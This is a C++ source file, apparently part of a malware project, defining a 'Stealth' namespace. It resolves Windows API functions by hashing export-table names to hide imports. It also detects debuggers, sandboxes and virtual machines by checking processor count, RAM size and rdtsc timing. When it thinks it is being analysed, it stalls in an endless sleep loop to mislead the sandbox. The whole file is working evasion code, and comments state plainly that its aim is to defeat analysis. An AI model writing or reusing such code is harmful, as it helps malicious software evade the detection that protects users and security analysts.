#include "Stealth.h"
#include <winternl.h>
#include <intrin.h>

namespace Stealth {

    FARPROC GetApiByHash(HMODULE hModule, DWORD funcHash) {
        if (!hModule) return nullptr;

        PBYTE base = (PBYTE)hModule;
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(base + dosHeader->e_lfanew);

        // Safety check: Ensure the module has an export directory
        DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (exportDirRVA == 0) return nullptr;

        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(base + exportDirRVA);

        PDWORD names = (PDWORD)(base + exportDir->AddressOfNames);
        PDWORD functions = (PDWORD)(base + exportDir->AddressOfFunctions);
        PWORD ordinals = (PWORD)(base + exportDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
            const char* name = (const char*)(base + names[i]);
            if (HashApi(name) == funcHash) {
                return (FARPROC)(base + functions[ordinals[i]]);
            }
        }
        return nullptr;
    }

    bool IsBeingAnalyzed() {
        // 1. Basic Debugger Check
        if (IsDebuggerPresent()) return true;

        // 2. CPU Core Count (Many sandboxes only use 1 or 2 cores)
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        if (si.dwNumberOfProcessors < 2) return true;

        // 3. RAM Check (Sandboxes often have < 4GB)
        MEMORYSTATUSEX ms;
        ms.dwLength = sizeof(ms);
        GlobalMemoryStatusEx(&ms);
        if (ms.ullTotalPhys < (3ULL * 1024 * 1024 * 1024)) return true; // < 3GB

        // 4. Timing Check (Emulators/VMs can be slower)
        ULONGLONG t1 = __rdtsc();
        Sleep(50);
        ULONGLONG t2 = __rdtsc();
        if ((t2 - t1) < 100000) return true; // Way too fast, likely emulated

        return false;
    }

    void Initialize() {
        // Early Exit if being analyzed
        if (IsBeingAnalyzed()) {
            // Instead of a loud ExitProcess, we just hang or do something "normal"
            // so the sandbox thinks we are still running.
            while (true) {
                Sleep(10000);
            }
        }
    }
}
